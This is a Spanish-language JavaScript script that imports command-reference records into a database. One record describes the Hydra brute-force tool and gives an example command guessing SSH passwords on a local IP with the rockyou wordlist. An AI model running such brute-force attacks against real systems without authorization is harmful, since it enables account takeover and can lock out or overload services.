const ACTUALIZACION_HYDRA = {
  tipo: 'comando',
  titulo: 'Fuerza bruta de servicios con Hydra',
  categoria: 'SECURITY',
  plataformas: ['linux', 'macos'],
  resumen:
    'Herramienta rápida de fuerza bruta que admite múltiples protocolos (SSH, FTP, HTTP, etc.).',
  cuerpo: 'hydra -l <USUARIO> -P <WORDLIST> <IP> <SERVICIO>',
  ejemplo: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh',
  dificultad: 'intermedio',
  tags: ['fuerza', 'bruta', 'hydra', 'credenciales'],
  riesgo: 'alto',
  advertencia:
    'Puede bloquear cuentas de usuario o saturar el servicio objetivo si no se ajusta la velocidad.',
  nota: 'Utiliza -L para listas de usuarios en lugar de -l para un usuario fijo.',
};

function idNuevo(indice) {
  return `C${String(indice + 7).padStart(3, '0')}`;
}

async function main() {
  const existentes = (await dbRequest('contenidos.json')) ?? {};

  const registros = {};
  NUEVOS.forEach((contenido, indice) => {
    registros[idNuevo(indice)] = contenido;
  });
  registros.C0006 = ACTUALIZACION_HYDRA;

  console.log(
    `Modo: ${DRY_RUN ? 'simulacion (no escribe)' : 'IMPORTACION REAL'}`
  );
  console.log(
    `Contenidos: ${NUEVOS.length} nuevos + 1 actualizado (Hydra)\n`
  );

  for (const [id, contenido] of Object.entries(registros)) {
    const previo = existentes[id];

    const registro = {
      ...contenido,
      creadoPor: previo?.creadoPor ?? 'usuario',
      creadoEn: typeof previo?.creadoEn === 'number' ? previo.creadoEn : AHORA,
      actualizadoEn: AHORA,
    };

    const etiqueta = `${id} [${registro.categoria}] ${registro.titulo}`;

    if (DRY_RUN) {
      console.log(`[dry] ${etiqueta}`);
      continue;
    }

    await dbRequest(`contenidos/${id}.json`, { method: 'PUT', body: registro });
    console.log(`OK  ${etiqueta}`);
  }

  if (DRY_RUN) {
    console.log('\nNada se escribio. Ejecuta sin --dry para importar.');
    return;
  }

  const verificados = await dbRequest('contenidos.json?shallow=true');
  console.log(
    `\nTotal de contenidos en la base: ${Object.keys(verificados ?? {}).length}`
  );
}

main().catch((error) => {
  console.error('\nError:', error.message);
  process.exit(1);
});
